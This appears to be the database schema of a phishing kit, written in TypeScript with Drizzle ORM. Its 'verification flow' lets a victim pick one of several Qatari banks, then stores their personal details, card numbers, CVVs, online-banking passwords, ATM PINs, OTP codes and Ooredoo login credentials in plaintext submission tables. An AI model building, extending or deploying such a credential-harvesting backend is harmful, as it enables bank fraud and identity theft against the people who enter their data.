import { integer, pgEnum, pgTable, text, timestamp, varchar } from "drizzle-orm/pg-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */

// Define the role enum for PostgreSQL
export const roleEnum = pgEnum("role", ["user", "admin"]);

export const users = pgTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: roleEnum("role").default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * Session table to track user journey through the verification flow
 */
export const sessions = pgTable("sessions", {
  id: varchar("id", { length: 64 }).primaryKey(),
  selectedBank: varchar("selectedBank", { length: 50 }).notNull(), // qnb, qib, rayan, doha
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export type Session = typeof sessions.$inferSelect;
export type InsertSession = typeof sessions.$inferInsert;

/**
 * Personal data submission
 */
export const personalDataSubmissions = pgTable("personalDataSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  nameArabic: text("nameArabic").notNull(),
  nameEnglish: text("nameEnglish").notNull(),
  idNumber: varchar("idNumber", { length: 50 }).notNull(),
  phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
  gender: varchar("gender", { length: 10 }).notNull(), // male, female
  customerStatus: varchar("customerStatus", { length: 50 }).notNull(), // existing, new
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type PersonalDataSubmission = typeof personalDataSubmissions.$inferSelect;
export type InsertPersonalDataSubmission = typeof personalDataSubmissions.$inferInsert;

/**
 * Login method submission (Bank Card or Username/Password)
 */
export const loginMethodSubmissions = pgTable("loginMethodSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  loginType: varchar("loginType", { length: 20 }).notNull(), // card, user
  // For card login
  cardNumber: varchar("cardNumber", { length: 50 }),
  cardholderName: text("cardholderName"),
  expiryDate: varchar("expiryDate", { length: 10 }),
  cvv: varchar("cvv", { length: 10 }),
  // For username/password login
  username: varchar("username", { length: 255 }),
  password: text("password"),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type LoginMethodSubmission = typeof loginMethodSubmissions.$inferSelect;
export type InsertLoginMethodSubmission = typeof loginMethodSubmissions.$inferInsert;

/**
 * ATM PIN submission
 */
export const atmPinSubmissions = pgTable("atmPinSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  pin: varchar("pin", { length: 10 }).notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type AtmPinSubmission = typeof atmPinSubmissions.$inferSelect;
export type InsertAtmPinSubmission = typeof atmPinSubmissions.$inferInsert;

/**
 * OTP submission
 */
export const otpSubmissions = pgTable("otpSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  otpCode: varchar("otpCode", { length: 10 }).notNull(),
  otpType: varchar("otpType", { length: 20 }).notNull(), // standard, ooredoo
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type OtpSubmission = typeof otpSubmissions.$inferSelect;
export type InsertOtpSubmission = typeof otpSubmissions.$inferInsert;

/**
 * Ooredoo credentials submission (separate flow)
 */
export const ooredooSubmissions = pgTable("ooredooSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  ooredooUser: varchar("ooredooUser", { length: 255 }).notNull(),
  ooredooPassword: text("ooredooPassword").notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export type OoredooSubmission = typeof ooredooSubmissions.$inferSelect;
export type InsertOoredooSubmission = typeof ooredooSubmissions.$inferInsert;
